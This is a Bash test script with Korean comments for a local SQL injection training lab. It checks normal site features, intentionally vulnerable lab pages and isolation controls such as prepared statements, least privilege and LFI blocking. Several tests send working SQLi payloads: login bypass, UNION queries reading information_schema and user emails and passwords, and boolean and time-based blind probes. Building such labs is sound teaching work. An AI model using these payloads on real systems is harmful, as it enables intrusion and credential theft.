#!/usr/bin/env bash
# 자동 테스트 (로컬 전용). 정상 기능 + 의도된 취약 기능 모두 검증.
set -uo pipefail
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"; cd "$ROOT_DIR"
[ -f .env ] && { set -a; . ./.env; set +a; }
DC="docker compose"
WEB=http://127.0.0.1:${WEB_PORT:-8000}; OBS=http://127.0.0.1:${OBSERVER_PORT:-8002}
JAR="$(mktemp)"; PASS=0; FAIL=0; N=0
ok(){ N=$((N+1)); printf "  [%02d] \033[32mPASS\033[0m %s\n" "$N" "$1"; PASS=$((PASS+1)); }
no(){ N=$((N+1)); printf "  [%02d] \033[31mFAIL\033[0m %s  -- %s\n" "$N" "$1" "${2:-}"; FAIL=$((FAIL+1)); }
g(){ curl -s -G "$@"; }               # GET (urlencode via --data-urlencode)
has(){ echo "$1" | grep -q -- "$2"; }

echo "== 1~3 인프라 =="
# 1 컨테이너 healthy
dbh=$($DC ps db --format '{{.Health}}' 2>/dev/null); webh=$($DC ps web --format '{{.Health}}' 2>/dev/null)
[ "$dbh" = healthy ] && [ "$webh" = healthy ] && ok "필수 컨테이너 healthy (db=$dbh web=$webh)" || no "컨테이너 healthy" "db=$dbh web=$webh"
# 2 /health 200
code=$(curl -s -o /dev/null -w '%{http_code}' $WEB/health); [ "$code" = 200 ] && ok "/health 200" || no "/health 200" "code=$code"
# 3 utf8mb4
cs=$(curl -s $WEB/health | grep -o '"charset":"[^"]*"'); has "$cs" utf8mb4 && ok "DB charset utf8mb4 ($cs)" || no "charset utf8mb4" "$cs"

echo "== 4~7 정상 기능 =="
# 4 register + login
RMAIL="t$$@x.com"
reg=$(curl -s -c "$JAR" -d "email=$RMAIL" -d "password=pw123" $WEB/ksj/act/register.php)
has "$reg" success && ok "회원가입 정상" || no "회원가입" "$reg"
lg=$(curl -s -c "$JAR" -d "email=$RMAIL" -d "password=pw123" $WEB/ksj/act/login.php)
has "$lg" "location.href" && ! has "$lg" "login failed" && ok "로그인 정상" || no "로그인" "$lg"
# 5~7 board lists (need login session -> use jar)
fb=$(curl -s -b "$JAR" "$WEB/ksj/index.php?p=board.php&t=freeboard"); has "$fb" "첫 자유게시글" && ok "freeboard 조회" || no "freeboard 조회"
nt=$(curl -s -b "$JAR" "$WEB/ksj/index.php?p=board.php&t=notice");   has "$nt" "실습 환경 안내" && ok "notice 조회" || no "notice 조회"
pd=$(curl -s -b "$JAR" "$WEB/ksj/index.php?p=board.php&t=pds");      has "$pd" "로고 파일" && ok "pds 조회" || no "pds 조회"

echo "== 8~13 SQLi 실습 =="
# 8 문자열형 로그인 SQLi (level1)
s8=$(curl -s --data-urlencode "email=x' or '1'='1" --data-urlencode "password=x' or '1'='1" $WEB/labs/level1.php)
has "$s8" "로그인 성공" && ok "문자열형 SQLi 우회" || no "문자열형 SQLi" 
# 9 숫자형 SQLi
s9=$(g $WEB/labs/level2.php --data-urlencode "idx=0 or 1=1"); c9=$(echo "$s9"|grep -o "<tr>"|wc -l); [ "$c9" -gt 2 ] && ok "숫자형 SQLi (다중행 $c9)" || no "숫자형 SQLi" "rows=$c9"
# 10 order by 8 성공
o8=$(g $WEB/labs/level3.php --data-urlencode "idx=1 order by 8"); ! has "$o8" "DB 오류" && ok "ORDER BY 8 성공" || no "ORDER BY 8" 
# 11 order by 9 실패
o9=$(g $WEB/labs/level3.php --data-urlencode "idx=1 order by 9"); has "$o9" "Unknown column" && ok "ORDER BY 9 실패(에러)" || no "ORDER BY 9 실패" 
# 12 8컬럼 union
u8=$(g $WEB/labs/level3.php --data-urlencode "idx=0 union select 1,2,3,4,5,6,7,8"); has "$u8" ">8<" && ok "8컬럼 UNION 동작" || no "8컬럼 UNION" 
# 13 information_schema
is=$(g $WEB/labs/level4.php --data-urlencode "idx=0 union select 1,2,3,group_concat(table_name),5,6,7,8 from information_schema.tables where table_schema=database()")
has "$is" "users" && has "$is" "freeboard" && ok "information_schema 탐색" || no "information_schema" 

echo "== 14~20 고급 =="
# 14 boolean true/false 차이
bt=$(g $WEB/labs/level6.php --data-urlencode "idx=1 and 1=1"); bf=$(g $WEB/labs/level6.php --data-urlencode "idx=1 and 1=2")
has "$bt" "TRUE" && has "$bf" "FALSE" && ok "Boolean 참/거짓 차이" || no "Boolean blind" 
# 15 time-based 차이
t0=$(date +%s%N); g $WEB/labs/level8.php --data-urlencode "idx=1 and sleep(2)" >/dev/null; t1=$(date +%s%N)
ms=$(( (t1-t0)/1000000 )); [ "$ms" -ge 1500 ] && ok "Time-based 지연 (${ms}ms)" || no "Time-based" "${ms}ms"
# 16 prepared 차단
pp=$(g $WEB/labs/filter/prepared.php --data-urlencode "q=' or 1=1 -- "); has "$pp" "0 행" && ok "Prepared 동일 입력 차단" || no "Prepared 차단" 
# 17 식별자 화이트리스트
gw=$(g $WEB/labs/level11.php --data-urlencode "sort=title); DROP" --data-urlencode "mode=good"); ! has "$gw" "DB 오류" && ok "식별자 화이트리스트 폴백(거부)" || no "식별자 화이트리스트" 
# 18 2차 SQLi vuln vs safe
curl -s -d "username=atk$$" --data-urlencode "nickname=zzz' union select role,username,nickname from ladder_members -- " $WEB/labs/level13.php >/dev/null
mid=$($DC exec -T db mariadb -uroot -p"$MARIADB_ROOT_PASSWORD" -N -e "select max(id) from sbadmin.ladder_members" 2>/dev/null | tr -d '\r')
v=$(g $WEB/labs/level13.php --data-urlencode "id=$mid" --data-urlencode "mode=vuln"|grep -o "<tr>"|wc -l)
sf=$(g $WEB/labs/level13.php --data-urlencode "id=$mid" --data-urlencode "mode=safe"|grep -o "<tr>"|wc -l)
[ "$v" -gt "$sf" ] && ok "2차 SQLi 취약>수정 (v=$v s=$sf)" || no "2차 SQLi" "v=$v s=$sf"
# 19 저장 프로시저 vuln vs safe
pv=$(g $WEB/labs/level14.php --data-urlencode "kw=%' or '1'='1" --data-urlencode "sp=vuln"|grep -o "<tr>"|wc -l)
ps=$(g $WEB/labs/level14.php --data-urlencode "kw=%' or '1'='1" --data-urlencode "sp=safe"|grep -o "<tr>"|wc -l)
[ "$pv" -gt "$ps" ] && ok "SP 취약>안전 (v=$pv s=$ps)" || no "저장 프로시저" "v=$pv s=$ps"
# 20 최소권한
mp=$(g $WEB/labs/level15.php --data-urlencode "idx=0 union select idx,email,password,4 from users")
has "$mp" "admin@sbadmin.local" && has "$mp" "denied" && ok "최소권한: app 노출 / limited 거부" || no "최소권한" 

echo "== 21~26 관찰/격리 =="
# 21 observer trace 연결
tr=$(curl -s -D - -o /dev/null $WEB/labs/level2.php?idx=1 | grep -i x-lab-trace-id | tr -d '\r' | awk '{print $2}')
obs=$(g $OBS/ --data-urlencode "token=$INSTRUCTOR_TOKEN" --data-urlencode "trace=$tr")
if has "$obs" "freeboard where idx" || has "$obs" "from freeboard"; then ok "Observer trace→SQL 연결 ($tr)"; else no "Observer 연결" "$tr"; fi
# 22 blind 학생 모드 SQL 숨김
trb=$(curl -s -D - -o /dev/null "$WEB/labs/level6.php?idx=1%20and%201=1" | grep -i x-lab-trace-id | tr -d '\r' | awk '{print $2}')
stu=$(g $OBS/ --data-urlencode "trace=$trb")
has "$stu" "숨김" && ! has "$stu" "lab_secret" && ok "Blind 학생모드 SQL 숨김" || no "Blind 숨김" 
# 23 포트 외부 미공개 (db 미공개 + 127.0.0.1 바인딩)
dbport=$($DC port db 3306 2>/dev/null || true); if echo "$dbport" | grep -qE "[0-9]:3306|0\\.0\\.0\\.0"; then no "DB 포트 공개됨" "$dbport"; else ok "DB 포트 미공개"; fi
bind=$($DC ps --format '{{.Publishers}}' web 2>/dev/null); has "$bind" "127.0.0.1" && ok "web 127.0.0.1 바인딩" || no "web 바인딩" "$bind"
# 24 lab_app FILE 권한 없음
gr=$($DC exec -T db mariadb -uroot -p"$MARIADB_ROOT_PASSWORD" -N -e "show grants for '${LAB_APP_USER}'@'%'" 2>/dev/null)
! has "$gr" "FILE" && ! has "$gr" "SUPER" && ! has "$gr" "ALL PRIVILEGES" && ok "lab_app FILE/SUPER 없음" || no "lab_app 권한" "$gr"
# 25 SQLI 모드: 다운로드(임의파일읽기)/LFI 차단
dl=$(curl -s -o /dev/null -w '%{http_code}' "$WEB/ksj/act/download.php?t=pds&i=1"); [ "$dl" = 403 ] && ok "download(파일읽기) 차단(403)" || no "download 차단" "code=$dl"
lfi=$(curl -s -b "$JAR" "$WEB/ksj/index.php?p=../init.php"); has "$lfi" "비활성화" && ok "LFI(?p=) 차단" || no "LFI 차단" 
# 26 reset 복원
before=$($DC exec -T db mariadb -uroot -p"$MARIADB_ROOT_PASSWORD" -N -e "select count(*) from sbadmin.users" 2>/dev/null|tr -d '\r')
curl -s -d "email=extra$$@x.com" -d "password=p" $WEB/ksj/act/register.php >/dev/null
bash scripts/reset.sh >/dev/null 2>&1
after=$($DC exec -T db mariadb -uroot -p"$MARIADB_ROOT_PASSWORD" -N -e "select count(*) from sbadmin.users" 2>/dev/null|tr -d '\r')
ai=$($DC exec -T db mariadb -uroot -p"$MARIADB_ROOT_PASSWORD" -N -e "select auto_increment from information_schema.tables where table_schema='sbadmin' and table_name='users'" 2>/dev/null|tr -d '\r')
[ "$after" = 7 ] && [ "$ai" = 8 ] && ok "reset 복원 (users=$after, AI=$ai)" || no "reset 복원" "after=$after ai=$ai"

rm -f "$JAR"
echo; echo "결과: $PASS/$N PASS, $FAIL FAIL"
[ "$FAIL" -eq 0 ]
